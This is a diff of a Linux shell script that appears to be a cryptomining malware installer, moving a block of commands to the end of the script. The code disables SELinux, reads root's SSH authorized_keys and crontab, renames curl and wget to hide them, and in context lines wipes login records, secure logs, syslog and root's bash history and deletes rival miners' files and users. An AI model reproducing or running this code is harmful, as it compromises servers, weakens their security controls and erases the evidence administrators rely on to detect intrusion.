@@ -147,23 +147,6 @@ echo
 echo
 echo
 
-setenforce 0 2>dev/null
-echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
-sync && echo 3 >/proc/sys/vm/dro
-crondir='/var/spool/cron/'"$USER"
-cont=`cat ${crondir}`
-ssht=`cat /root/.ssh/authorized_keys`
-echo 1 > /etc/zzhs
-rtdir="/etc/zzhs"
-bbdir="/usr/bin/curl"
-bbdira="/usr/bin/cd1"
-ccdir="/usr/bin/wget"
-ccdira="/usr/bin/wd1"
-mv /usr/bin/curl /usr/bin/url
-mv /usr/bin/url /usr/bin/cd1
-mv /usr/bin/wget /usr/bin/get
-mv /usr/bin/get /usr/bin/wd1
-
 ulimit -n 65535
 rm -rf /var/log/syslog
 chattr -iua /tmp/
@@ -179,8 +162,6 @@ userdel vfinder
 rm -rf /tmp/addres*
 rm -rf /tmp/walle*
 rm -rf /tmp/keys
-
-
 
 # start doing stuff: preparing server
 kill_miner_proc()
@@ -961,6 +942,23 @@ echo > /var/spool/mail/root
 echo > /var/log/wtmp
 echo > /var/log/secure
 echo > /root/.bash_history
+
+setenforce 0 2>dev/null
+echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
+sync && echo 3 >/proc/sys/vm/dro
+crondir='/var/spool/cron/'"$USER"
+cont=`cat ${crondir}`
+ssht=`cat /root/.ssh/authorized_keys`
+echo 1 > /etc/zzhs
+rtdir="/etc/zzhs"
+bbdir="/usr/bin/curl"
+bbdira="/usr/bin/cd1"
+ccdir="/usr/bin/wget"
+ccdira="/usr/bin/wd1"
+mv /usr/bin/curl /usr/bin/url
+mv /usr/bin/url /usr/bin/cd1
+mv /usr/bin/wget /usr/bin/get
+mv /usr/bin/get /usr/bin/wd1
 
 echo "[*] Setup complete"
 echo "[*] 安装完成"
